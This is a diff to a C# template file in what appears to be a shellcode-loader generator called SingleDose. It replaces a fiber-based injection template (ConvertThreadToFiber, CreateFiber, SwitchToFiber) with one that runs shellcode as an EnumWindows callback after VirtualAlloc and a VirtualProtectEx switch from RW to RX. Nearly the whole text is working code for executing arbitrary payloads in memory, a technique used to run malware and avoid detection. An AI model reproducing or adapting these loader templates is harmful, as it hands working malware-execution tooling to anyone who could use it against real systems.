@@ -1,8 +1,8 @@
 ﻿namespace SingleDose
 {
-    class FiberInject
+    class EnumWindows
     {
-        public static string STATIC= @"
+        public static string STATIC = @"
             List<byte> payloadList = new List<byte> { {{SHELLCODE}} };
             byte[] payload = payloadList.ToArray();";
 
@@ -13,7 +13,7 @@
             }
             ArgValues parsedArgs = ArgParse(args);
             byte[] payload = System.IO.File.ReadAllBytes(parsedArgs.binPath);";
-        
+
         public static string DYNAMIC_ARGPARSE = @"
         public class ArgValues
         {
@@ -102,37 +102,25 @@ namespace {{NAMESPACE}}
 {
     class Program
     {
-
         public static void Main(string[] args)
         {
             {{TRIGGER}}
             {{MODE}}
-
-            IntPtr newFiber = ConvertThreadToFiber(IntPtr.Zero); //Necessary. Microsoft says that only fibers can execute fibers. See ConvertThreadToFiber() Docs.
-            IntPtr payloadLocation = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000,0x04); //0x1000 = MEM_COMMIT,0x04= RW
-            Marshal.Copy(payload,0,payloadLocation,payload.Length);
-            uint oldprotect;
-            VirtualProtectEx(Process.GetCurrentProcess().Handle,payloadLocation,(UIntPtr)payload.Length,0x20,out oldprotect); //0x20 = RX
-            IntPtr shellcodeFiber = CreateFiber(0, payloadLocation, IntPtr.Zero);
-            SwitchToFiber(shellcodeFiber);
+            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, 0x04);//0x04 = RW
+            Marshal.Copy(payload, 0, hAlloc, payload.Length);
+            uint oldProtect;
+            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, (UIntPtr)payload.Length, 0x20, out oldProtect); //0x20 = RX
+            EnumWindows(hAlloc, IntPtr.Zero);
         }
-
         {{ARGS}}
-
-        [DllImport(""kernel32.dll"")]
-        static extern IntPtr ConvertThreadToFiber(IntPtr lpParameter);
-
         [DllImport(""kernel32"")]
         public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-        [DllImport(""kernel32.dll"")]
-        static extern IntPtr CreateFiber(uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);
-
-        [DllImport(""kernel32.dll"")]
-        extern static IntPtr SwitchToFiber(IntPtr fiberAddress);
-
         [DllImport(""kernel32.dll"")]
         static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport(""user32.dll"")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool EnumWindows(IntPtr lpEnumFunc, IntPtr lParam);
     }
 }";
     }
